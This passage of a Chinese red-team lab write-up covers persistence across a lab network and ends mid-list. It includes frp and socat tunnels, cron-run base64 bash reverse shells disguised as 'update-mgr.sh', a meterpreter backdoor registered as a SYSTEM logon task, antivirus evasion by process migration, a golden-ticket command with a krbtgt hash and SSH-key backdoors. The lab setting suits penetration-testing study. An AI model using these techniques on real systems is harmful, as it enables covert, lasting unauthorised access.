+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-36-38.png" /></p>
+</li>
+<li>
+<p>Web2 侧配置（93网段的出口）
+  Web2 上只需要运行 frpc 去连接 Web1 的 frps</p>
+</li>
+<li>
+<p>配置frpc.toml
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>serverAddr = &quot;192.168.52.10&quot; # 连 Web1 的 52 网段 IP
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>serverPort = 7001            # 连 Web1 刚刚开的 frps 端口
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>
+</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a># 开启 93 网段的 socks5 代理
+</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>[[proxies]]
+</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a>name = &quot;socks5_proxy_93&quot;
+</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a>type = &quot;tcp&quot;
+</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a>remotePort = 9052 # 注意：这里在 Web1 的本地会监听 9052
+</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a>[proxies.plugin]
+</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a>type = &quot;socks5&quot;
+</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a>
+</span><span id="__span-88-12"><a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a># --- 增加：用于接收 93 网段反向 Shell 并转发给上游的配置 ---
+</span><span id="__span-88-13"><a id="__codelineno-88-13" name="__codelineno-88-13" href="#__codelineno-88-13"></a>[[proxies]]
+</span><span id="__span-88-14"><a id="__codelineno-88-14" name="__codelineno-88-14" href="#__codelineno-88-14"></a>name = &quot;web2_reverse_4444_PC1&quot;
+</span><span id="__span-88-15"><a id="__codelineno-88-15" name="__codelineno-88-15" href="#__codelineno-88-15"></a>type = &quot;tcp&quot;
+</span><span id="__span-88-16"><a id="__codelineno-88-16" name="__codelineno-88-16" href="#__codelineno-88-16"></a>localIP = &quot;127.0.0.1&quot;
+</span><span id="__span-88-17"><a id="__codelineno-88-17" name="__codelineno-88-17" href="#__codelineno-88-17"></a>
+</span><span id="__span-88-18"><a id="__codelineno-88-18" name="__codelineno-88-18" href="#__codelineno-88-18"></a>remotePort = &quot;4444&quot;   # 这是 Web1 上将被占用的端口，因为 Web1 需要接收 Web2 的请求
+</span><span id="__span-88-19"><a id="__codelineno-88-19" name="__codelineno-88-19" href="#__codelineno-88-19"></a>
+</span><span id="__span-88-20"><a id="__codelineno-88-20" name="__codelineno-88-20" href="#__codelineno-88-20"></a>[[proxies]]
+</span><span id="__span-88-21"><a id="__codelineno-88-21" name="__codelineno-88-21" href="#__codelineno-88-21"></a>name = &quot;web2_reverse_4445_PC2&quot;
+</span><span id="__span-88-22"><a id="__codelineno-88-22" name="__codelineno-88-22" href="#__codelineno-88-22"></a>type = &quot;tcp&quot;
+</span><span id="__span-88-23"><a id="__codelineno-88-23" name="__codelineno-88-23" href="#__codelineno-88-23"></a>localIP = &quot;127.0.0.1&quot;
+</span><span id="__span-88-24"><a id="__codelineno-88-24" name="__codelineno-88-24" href="#__codelineno-88-24"></a>remotePort = &quot;4445&quot;   # 这是 Web1 上将被占用的端口，因为 Web1 需要接收 Web2 的请求
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-40-47.png" /></p>
+</li>
+<li>
+<p>把frpc启动命令写入systemd服务实现开机自启动
+    /etc/systemd/system/frp-proxy.service 
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>[Unit]
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>Description=Network Forwarding (93-proxy) Service
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>After=network-online.target
+</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a>Wants=network-online.target
+</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>
+</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a>
+</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a>[Service]
+</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a>Type=simple
+</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a>ExecStart=/frpc -c /frpc.toml
+</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a>Restart=always
+</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a>RestartSec=10
+</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a>User=root
+</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a>
+</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a>[Install]
+</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a>WantedBy=multi-user.target    
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-44-42.png" /></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>systemctl enable frp-proxy.service  
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>systemctl start frp-proxy.service 
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>systemctl status frp-proxy.service 
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-47-14.png" /></p>
+</li>
+</ul>
+<p>测试连通性
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-03-32.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-17-52.png" />
+没问题</p>
+<h3 id="_24">端口转发持久化<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>要保证内网机器上的msf木马可以反向连接kali就需要进行端口转发持久化操作</p>
+</blockquote>
+<ul>
+<li><strong>端口转发总览</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>pc1——&gt;web1:6001——&gt;kali:3001
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>pc2——&gt;web2:8002——&gt;web1——&gt;6002——&gt;kali:3002
+</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>DC——&gt;web2:8003——&gt;web:6003——&gt;kali:3003
+</span></code></pre></div></li>
+<li><strong>创建脚本<code>/usr/local/bin/port-translate.sh</code>写入端口转发命令榜加上执行权限</strong></li>
+<li>web1
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>#!/bin/bash
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>nohup socat TCP4-LISTEN:6001,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3001 &gt; /dev/null 2&gt;&amp;1 &amp;
+</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>
+</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>nohup socat TCP4-LISTEN:6002,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3002 &gt;/dev/null 2&gt;&amp;1 &amp;
+</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a>
+</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a>nohup socat TCP4-LISTEN:6003,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3003 &gt;/dev/null 2&gt;&amp;1 &amp;
+</span><span id="__span-92-7"><a id="__codelineno-92-7" name="__codelineno-92-7" href="#__codelineno-92-7"></a>
+</span><span id="__span-92-8"><a id="__codelineno-92-8" name="__codelineno-92-8" href="#__codelineno-92-8"></a>wait
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-03-43-21.png" /></li>
+<li>
+<p>web2
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>#!/bin/bash
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>nohup socat TCP4-LISTEN:8002,bind=192.168.93.10,reuseaddr,fork TCP4:192.168.52.10:6002 &gt; /dev/null 2&gt;&amp;1  &amp;
+</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>
+</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>nohup socat TCP4-LISTEN:8003,bind=192.168.93.10,reuseaddr,fork TCP4:192.168.52.10:6003 &gt;/dev/null 2&gt;&amp;1 &amp;
+</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>
+</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>wait
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>将脚本写入systemd服务实现持久化</strong> <br />
+  /etc/systemd/system/port-translate.service</p>
+</li>
+<li>web1
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>[Unit]
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>Description=Socat Forward
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>After=network.target  # 网络启动后运行
+</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>
+</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>[Service]
+</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>Type=simple
+</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>ExecStart=/usr/local/bin/port-translate.sh
+</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a>Restart=always  # 确保崩溃后重启
+</span><span id="__span-94-9"><a id="__codelineno-94-9" name="__codelineno-94-9" href="#__codelineno-94-9"></a>User=root
+</span><span id="__span-94-10"><a id="__codelineno-94-10" name="__codelineno-94-10" href="#__codelineno-94-10"></a>
+</span><span id="__span-94-11"><a id="__codelineno-94-11" name="__codelineno-94-11" href="#__codelineno-94-11"></a>[Install]
+</span><span id="__span-94-12"><a id="__codelineno-94-12" name="__codelineno-94-12" href="#__codelineno-94-12"></a>WantedBy=multi-user.target
+</span></code></pre></div></li>
+<li>web2<br />
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>[Unit]
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>Description=Socat Forward
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>After=network.target  # 网络启动后运行
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>
+</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a>[Service]
+</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>Type=simple
+</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a>ExecStart=/usr/local/bin/port-translate.sh
+</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a>Restart=always  # 确保崩溃后重启
+</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#__codelineno-95-9"></a>User=root
+</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#__codelineno-95-10"></a>
+</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#__codelineno-95-11"></a>[Install]
+</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#__codelineno-95-12"></a>WantedBy=multi-user.target
+</span></code></pre></div>
+  <strong>启用并启动服务</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>systemctl daemon-reload
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>systemctl enable port-translate.service
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>systemctl start port-translate.service
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>systemctl status port-translate.service
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-03-51-45.png" />
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-04-07-31.png" /></li>
+</ul>
+<h3 id="web1dmz">Web1（DMZ）<a class="headerlink" href="#web1dmz" title="Permanent link">&para;</a></h3>
+<ul>
+<li>连接持久化：反弹shell定时任务(主动连接kali的2345端口)</li>
+<li>利用Linux 计划任务 (crontab) 和 Base64 编码
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>echo &#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2Mi4xMjgvMjM0NSAwPiYx | base64 -d | bash&#39; &gt; /usr/local/bin/update-mgr.sh
+</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>chmod +x /usr/local/bin/update-mgr.sh
+</span></code></pre></div></li>
+<li>
+<p>加入定时任务，每分钟唤醒
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>(crontab -l; echo &quot;* * * * * /usr/local/bin/update-mgr.sh&quot;) | crontab -
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-30-14.png" /></p>
+</li>
+<li>
+<p>检验定时任务是否工作正常
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-32-51.png" />
+  kali监听2345端口后一会就有反弹shell建立成功</p>
+</li>
+<li>
+<p>web2反弹shell通道持久化：socat 转发自启动</p>
+</li>
+<li>
+<p>创建 /etc/systemd/system/net-forward.service
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>[Unit]
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>Description=Network Forwarding (52-&gt;kali) Service
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>After=network-online.target
+</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>Wants=network-online.target
+</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a>
+</span><span id="__span-99-6"><a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a>
+</span><span id="__span-99-7"><a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a>[Service]
+</span><span id="__span-99-8"><a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a># listen port 1234 and forward to kali:1234
+</span><span id="__span-99-9"><a id="__codelineno-99-9" name="__codelineno-99-9" href="#__codelineno-99-9"></a>Type=simple
+</span><span id="__span-99-10"><a id="__codelineno-99-10" name="__codelineno-99-10" href="#__codelineno-99-10"></a>ExecStart=/usr/bin/socat TCP4-LISTEN:1234,fork TCP4:192.168.162.128:1234
+</span><span id="__span-99-11"><a id="__codelineno-99-11" name="__codelineno-99-11" href="#__codelineno-99-11"></a>Restart=always
+</span><span id="__span-99-12"><a id="__codelineno-99-12" name="__codelineno-99-12" href="#__codelineno-99-12"></a>RestartSec=10
+</span><span id="__span-99-13"><a id="__codelineno-99-13" name="__codelineno-99-13" href="#__codelineno-99-13"></a>User=root
+</span><span id="__span-99-14"><a id="__codelineno-99-14" name="__codelineno-99-14" href="#__codelineno-99-14"></a>
+</span><span id="__span-99-15"><a id="__codelineno-99-15" name="__codelineno-99-15" href="#__codelineno-99-15"></a>[Install]
+</span><span id="__span-99-16"><a id="__codelineno-99-16" name="__codelineno-99-16" href="#__codelineno-99-16"></a>WantedBy=multi-user.target
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-19-14.png" />
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-18-32.png" /></p>
+</li>
+</ul>
+<h3 id="web2_1">Web2<a class="headerlink" href="#web2_1" title="Permanent link">&para;</a></h3>
+<p>连接持久化——定时任务：反弹后门（主动连接kali的1234端口）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>echo &#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEwLzEyMzQgMD4mMQo= | base64 -d | bash&#39; &gt; /usr/local/bin/update-mgr.sh
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>chmod +x /usr/local/bin/update-mgr.sh
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>(crontab -l; echo &quot;* * * * * /usr/local/bin/update-mgr.sh&quot;) | crontab -
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-43-17.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-49-40.png" />
+kali监听1234后成功连接上反弹shell</p>
+<h3 id="pc1pc2">PC1/pc2<a class="headerlink" href="#pc1pc2" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>pc2和pc1思路一致，这里只写pc1
+将msf木马伪装成systemd服务实现自启动
+在用户登陆系统时自动以SYSTEM权限运行木马</p>
+</blockquote>
+<ul>
+<li>
+<p>生成msf木马并上传到pc1
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.52.10 lport=6001 -f exe -o PC2_backdoor.exe
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-42-43.png" /></p>
+</li>
+<li>
+<p>通过msf本身的指令创建服务
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>meterpreter &gt; execute -f cmd.exe -a &quot;/c schtasks /create /tn SystemMaintenance /tr C:\Windows\System32\pc1_sync.exe /sc onlogon /ru SYSTEM /f&quot;
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-43-11.png" /></p>
+</li>
+<li>为防止被查杀，可将木马注入系统进程
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>meterpreter &gt; migrate -N explorer.exe
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-44-18.png" /></li>
+</ul>
+<h3 id="dc_1">DC<a class="headerlink" href="#dc_1" title="Permanent link">&para;</a></h3>
+<p><strong>黄金票据</strong>
+根据前面获取的凭据和信息
+<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>WHOAMIANONY / S-1-5-21-1315137663-3706837544-1429009142
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>
+</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>krbtgt的NTLM哈希：6be58bfcc0a164af2408d1d3bd313c2a
+</span></code></pre></div></p>
+<p>使用msf
+<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>kiwi_cmd &quot;kerberos::golden /user:Administrator /domain:WHOAMIANONY.ORG /sid:S-1-5-21-1315137663-3706837544-1429009 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ptt&quot;
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-39-00.png" />
+查看注入的票据
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-41-58.png" />
+注入成功</p>
+<h2 id="_25">遇到的问题<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h2>
+<h3 id="_26">网络连接问题<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong></p>
+<p>网卡配置没问题但是web1 ping不通pc1，pc1也ping不通web1</p>
+<p><strong>解决方法</strong></p>
+<p>pc1的网络适配器1我设置成了VMnet10，网络适配器2我设置成了VMnet9，此时pc1与web1无法通信
+把网络适配器1我设置成了VMnet9，网络适配器2设置成了VMnet10，此时pc1与web1就可以正常通信了</p>
+<p><strong>原因</strong></p>
+<ul>
+<li>
+<p>在 VMware 的底层，一个 VMnet 就是一台独立的虚拟二层交换机。</p>
+</li>
+<li>
+<p>比如 VMnet10 是一台交换机，VMnet9 是另一台交换机。</p>
+</li>
+<li>
+<p>它们之间默认是不通网线的</p>
+</li>
+<li>
+<p>Web1 的内网网卡选了 VMnet10，PC1 的内网网卡选了 VMnet10，就等于把这两台机器的网线，插在了同一台叫 VMnet10 的交换机上。</p>
+</li>
+<li>
+<p>只要它们在同一个交换机上，且 IP 在同一个网段（192.168.52.0/24），它们就能直接通过 ARP 广播找到对方的 MAC 地址，实现二层互通</p>
+</li>
+<li>
+<p>虚拟机的系统（比如 Windows 里的“本地连接 1（网络适配器1）”、“本地连接 2（网络适配器2）”）不知道自己插在哪个交换机上，它只认自己配了什么 IP。</p>
+</li>
+<li>
+<p>如果系统把 52 网段的 IP 配给了“本地连接 1”，但 VMware 底层把“本地连接 1”接到了 VMnet10（93网段的交换机）上。</p>
+</li>
+<li>
+<p>这时候系统一发数据，就走错了门，跑到 93 网段的交换机上去了，52 网段的机器自然收不到，就会报“目标主机不可达”。</p>
+</li>
+<li>
+<p>调换适配器，本质上是把网线重新插回了正确的交换机。</p>
+</li>
+</ul>
+<h3 id="_27">高版本哥斯拉连接问题<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong>
+用 EXP 脚本打出来的 Shell，用常规的哥斯拉（Godzilla）死活连不上</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-12-51.png" /></p>
+<p><strong>原因</strong>
+由于红日靶场 Web2 的 Laravel 环境版本特殊，网上的 EXP 脚本（比如 SecPros-Team 那个）是写死的，它利用 Laravel 漏洞时，会在目标服务器上生成一个特定版本的哥斯拉加密马（通常适配哥斯拉 2.x 版本）。现在手里的哥斯拉连不上，说明两边加密算法或通信协议对不上</p>
+<p><strong>解决方法</strong>
+核心思路是利用 phpggc 生成一条恶意的序列化 POC，让目标服务器在触发漏洞时，顺便执行一段系统命令，这段命令负责下载并写入一个最新版（4.0）的哥斯拉木马</p>
+<h3 id="_28">中文乱码问题<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong>
+在 MSF 获取到 Windows 主机（PC1）的 shell 后出现中文乱码</p>
+<p><strong>原因</strong>
+最常见的原因是 Windows 命令行的默认编码（GBK）与 Kali 终端使用的 UTF-8 编码不一致。</p>
+<p><strong>解决方法</strong>
+将 Windows 命令行的活动代码页切换为 UTF-8，从而让中文能够正常显示。
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>chcp 65001
+</span></code></pre></div></p>
+<h3 id="_29">环境变量无法修改<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong>
+在劫持环境变量时发现环境变量习修改不了</p>
+<p><strong>原因</strong>
+可能是shell的问题（Webshell不稳定），通过蚁剑、菜刀等 Webshell 管理工具的命令执行功能来运行这些命令，每一条命令都可能在一个独立的、非交互式的子 Shell 中执行。export 的效果无法传递到下一个命令的进程里</p>
+<p><strong>解决方法</strong></p>
+<p>获取反弹 Shell（Reverse Shell）</p>
+<ul>
+<li>
+<p>环境连贯：反弹 Shell 给你的是一段持续的连接，在里面执行 export，变量会保留在当前进程的内存里，下一条命令能立刻读到。</p>
+</li>
+<li>
+<p>规避受限：如果是受限的 Webshell 终端，反弹 Shell 直接建立了一个新的 TCP 连接，脱离原有的 Web 服务上下文，通常能直接拿到完整的交互式 Bash。</p>
+</li>
+</ul>
+<h3 id="ssh">为什么已经有了明文账号密码还需要写入ssh公钥<a class="headerlink" href="#ssh" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>主要是为了稳定、隐蔽和方便</p>
+</blockquote>
+<ol>
+<li>
+<p>突破密码登录的限制（最核心原因）
+   很多现代 Linux 系统（比如 Ubuntu）默认配置里，禁止 root 用户直接用密码登录 SSH（PermitRootLogin prohibit-password）。如果只拿密码，你直接用 ssh root@192.168.52.20 可能会被拒绝。但写入公钥后，只要开启了密钥登录，往往就能直接进。</p>
+</li>
+<li>
+<p>为了走代理（Proxychains）更方便
+   现在处于内网环境，要连 192.168.52.20，大概率是要挂代理（Proxychains）的。</p>
+</li>
+</ol>
+<p>如果是密码登录：你每次连都要经过代理，网络一卡，或者代理链一抖，输入密码就超时了，还得重头再来。</p>
+<p>如果是公钥登录：直接 proxychains4 ssh -i id_rsa root@192.168.52.20，一气呵成，不需要交互，非常丝滑。</p>
+<ol>
+<li>
+<p>做持久化后门（权限维持）
+   假设系统管理员发现了 Web 漏洞并修补了，甚至重置了密码，之前拿到的密码就失效了。但只要提前把公钥写进了 authorized_keys，私钥依然能随时登进去。这是标准的“留后门”操作。</p>
+</li>
+<li>
+<p>密码的局限性</p>
+</li>
+<li>
+<p>机器爆破：有些内网机器上，密码可能是不允许 SSH 登录的（比如 Web 端数据库密码，或者只允许特定用户 SSH）。</p>
+</li>
+<li>
+<p>其他服务：就算不写公钥用密码登进去了，有时候要去跑 Ansible、自动化脚本做内网横向时，免密登录是基础。</p>
+</li>
+</ol>
+<h3 id="kalisshweb2">在kali中ssh公钥认证登录web2失败<a class="headerlink" href="#kalisshweb2" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong>
+在kali中尝试用ssh秘钥认证方式登录web2，但是认证失败了</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-21-09.png" /></p>
+<p><strong>原因</strong></p>
+<p>Kali 和 Web2 之间无法协商出一致的签名算法。</p>
+<ul>
+<li>
+<p>Kali 客户端：OpenSSH_10.3p1（非常新）</p>
+</li>
+<li>
